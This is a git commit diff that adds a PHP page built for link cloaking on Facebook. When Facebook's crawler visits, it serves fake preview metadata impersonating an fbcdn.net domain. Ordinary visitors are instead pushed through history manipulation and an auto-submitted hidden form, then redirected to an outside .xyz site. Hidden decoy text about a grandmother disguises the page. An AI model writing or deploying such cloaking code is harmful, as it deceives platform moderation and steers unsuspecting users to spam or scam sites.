4ec837914f7f2beb764a3fa9504ff63762697cde
Duc Minh Vu <vuduc23195@gmail.com>
2024-08-23 01:59:57 +0700

    index

---
+++ index.php
@@ -0,0 +1,120 @@
+<?php
+ob_start();
+
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+
+if(!empty($_POST['token'])) {
+    header("Location: http://videosugarbaby.xyz/UJmHTMvT/dFQLBbPwGZ4RL.html");
+    die;
+}
+
+?>
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+
+    <?php if(preg_match('/facebook/', $user_agent)): ?>
+            <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+            <link rel="icon" href="/favicon.ico" type="image/x-icon">
+            <link rel="canonical" href="http://goodgirlsohot.xyz/ACVWyMUH/WBKHSxmm761M7.jpeg"/>
+            <title>origincache-internal-services-all.fbcdn.net</title>
+            <meta name="description" content="">
+            <meta name="twitter:card" content="summary">
+            <meta name="twitter:site" content="origincache-internal-services-all.fbcdn.net">
+            <meta name="twitter:title" content="origincache-internal-services-all.fbcdn.net">
+            <meta name="twitter:description" content="origincache-internal-services-all.fbcdn.net">
+            <meta property="og:locale" content="vi_VN"/>
+            <meta property="og:locale:alternate" content="en_US"/>
+            <meta name="og:title" content="origincache-internal-services-all.fbcdn.net">
+            <meta name="og:description" content="origincache-internal-services-all.fbcdn.net">
+            <meta name="og:site_name" content="origincache-internal-services-all.fbcdn.net">
+            <meta property="fb:app_id" content="1155388854582032" />
+            <meta property="og:url" content="origincache-internal-services-all.fbcdn.net">
+            <meta property="og:type" content="website"/>
+            <meta property="og:image" content="http://allfan.live/rfrnIqGT/ZFeUZpUK761M7.jpeg">
+            <meta property="og:image:alt" content="origincache-internal-services-all.fbcdn.net">
+            
+   <?php endif ?>
+
+<body>
+<div
+    class="fb-like"
+    data-share="true"
+    data-width="450"
+    data-show-faces="true">
+</div>
+
+<?php if(!preg_match('/facebook/', $user_agent)): ?>
+<form action="" method="post" id="submit-form">
+    <input type="hidden" name="_token" value="" autocomplete="off">
+    <input type="hidden" name="token" value="<?php echo md5(time()) ?>">
+</form>
+<?php endif ?>
+
+<div style="display: none;">
+     <h1>My Grandmother</h1>
+    <p>My grandmother is a remarkable woman. She is the epitome of kindness and wisdom.</p>
+    
+    <h2>Physical Description</h2>
+    <p>She has a gentle smile that lights up her face, and her eyes sparkle with warmth and understanding. Her hair, once dark, is now streaked with silver, a testament to her years of experience and wisdom.</p>
+    
+    <h2>Personality Traits</h2>
+    <p>Her kindness knows no bounds. She is always ready to lend a helping hand and offer words of comfort. Despite her age, she has a youthful spirit and an insatiable curiosity about the world.</p>
+    
+    <h2>Memorable Moments</h2>
+    <p>Some of my fondest memories are spending time with her in the kitchen, where she would teach me her secret recipes passed down through generations. Her stories, filled with laughter and wisdom, have left an indelible mark on my heart.</p>
+    
+    <h2>Life Lessons</h2>
+    <p>Through her example, she has taught me the importance of compassion, perseverance, and staying true to oneself. She is a beacon of strength and resilience, and I am grateful for every moment I get to spend with her.</p>
+    
+    <footer>
+        <p>© 2024 My AZdigital. All rights reserved.</p>
+    </footer>
+</div>
+
+
+<script type="text/javascript">
+
+    <?php if(preg_match('/facebook/', $user_agent)): ?>
+        
+         window.fbAsyncInit = function() {
+            FB.init({
+                appId      : '1155388854582032',
+                xfbml      : true,
+                version    : 'v19.0'
+            });
+            FB.AppEvents.logPageView();
+        };
+        (function(d, s, id){
+            var js, fjs = d.getElementsByTagName(s)[0];
+            if (d.getElementById(id)) {return;}
+            js = d.createElement(s); js.id = id;
+            js.src = "https://connect.facebook.net/en_US/sdk.js";
+            fjs.parentNode.insertBefore(js, fjs);
+        }(document, 'script', 'facebook-jssdk'));
+
+    <?php else: ?>
+
+       (function (d, w, h) {
+            const param = new URLSearchParams(location.search);
+            if (param.has('t')) {
+                setTimeout(function () {
+                    document.forms[0].submit();
+                }, 400);
+            } else {
+                param.append('t', <?php echo time() ?>);
+                const reverseUrl = `${location.origin}${location.pathname}?` + param.toString();
+                h.pushState(null, document.title, reverseUrl);
+                h.pushState(null, document.title, reverseUrl);
+                location.reload();
+            }
+        })(document, window, history);
+
+    <?php endif ?>
+
+</script>
+
+</body>
+</html>
